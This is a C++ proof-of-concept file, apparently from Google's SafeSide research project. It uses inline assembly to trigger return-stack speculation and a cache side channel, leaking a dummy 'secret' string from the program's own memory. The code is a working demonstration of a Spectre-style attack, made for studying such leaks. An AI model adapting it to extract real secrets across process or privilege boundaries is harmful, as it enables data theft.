/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <algorithm>
#include <array>
#include <cstring>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"

// TODO(asteinha) Make this work with ICC.
// TODO(asteinha) Implement support for MSVC and Windows.
// TODO(asteinha) Investigate the exploitability of PowerPC.

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution
// and side channel attacks
const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";
extern char afterspeculation[];

// Take the "afterspeculation" label address, push in on the stack, flush the
// stack address and return.
__attribute__((noinline))
void escape() {
  asm volatile(
#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
    defined(_M_IX86)
      "pushq %0\n"
      "clflush (%%rsp)\n"
      "mfence\n"
      "lfence\n"
      "ret\n"::"r"(afterspeculation));
#elif defined(__aarch64__)
      "adr x9, afterspeculation\n"
      "str x9, [sp, #-16]!\n"
      "mov x10, sp\n"
      "dc civac, x10\n"
      "dsb sy\n"
      "ldr x30, [sp], #16\n"
      "ret\n");
#elif defined(__powerpc__)

#else
#  error Unsupported CPU.
#endif
}

// Call the "escape" function which smashes the stack jumping back to the
// "afterspeculation" label in the "leak_byte" function never executing the
// code that follows the "escape" call in the "speculate" method.
__attribute__((noinline))
void speculation(const char *data, size_t offset,
                 const std::array<BigByte, 256> &isolated_oracle) {
  escape(); // Never returns

  // Architecturally dead code. Never reached.
  ForceRead(&isolated_oracle[static_cast<size_t>(data[offset])]);
  std::cout << "If this is printed, it signifies a fatal error. "
            << "This print statement is architecturally dead." << std::endl;
}

static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(data);
    ForceRead(&isolated_oracle[static_cast<size_t>(data[safe_offset])]);

    // Backup all registers and mark the end of the context backup with the
    // 0xfedcba9801234567 value.
    asm volatile(
        "BACKUP_REGISTERS\n"
#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
    defined(_M_IX86)
        "movq $0xfedcba9801234567, %rax\n"
        "pushq %rax\n");
#elif defined(__aarch64__)
        "movz x9, 0x4567\n"
        "movk x9, 0x0123, lsl 16\n"
        "movk x9, 0xba98, lsl 32\n"
        "movk x9, 0xfedc, lsl 48\n"
        "str x9, [sp, #-16]!\n");
#elif defined(__powerpc__)

#else
#  error Unsupported CPU.
#endif

    speculation(data, offset, isolated_oracle);

    // Unwind the stack until we find the 0xfedcba9801234567 value and then
    // restore all registers.
    asm volatile(
        "_afterspeculation:\n" // For MacOS.
        "afterspeculation:\n" // For Linux.
#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
    defined(_M_IX86)
        "movq $0xfedcba9801234567, %rax\n"
        "popq %rbx\n"
        "cmpq %rbx, %rax\n"
        "jnz afterspeculation\n"
#elif defined(__aarch64__)
        "movz x11, 0x4567\n"
        "movk x11, 0x0123, lsl 16\n"
        "movk x11, 0xba98, lsl 32\n"
        "movk x11, 0xfedc, lsl 48\n"
        "ldp x9, x10, [sp], #16\n"
        "cmp x11, x9\n"
        "bne afterspeculation\n"
#elif defined(__powerpc__)

#else
#  error Unsupported CPU.
#endif
        "RESTORE_REGISTERS\n");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
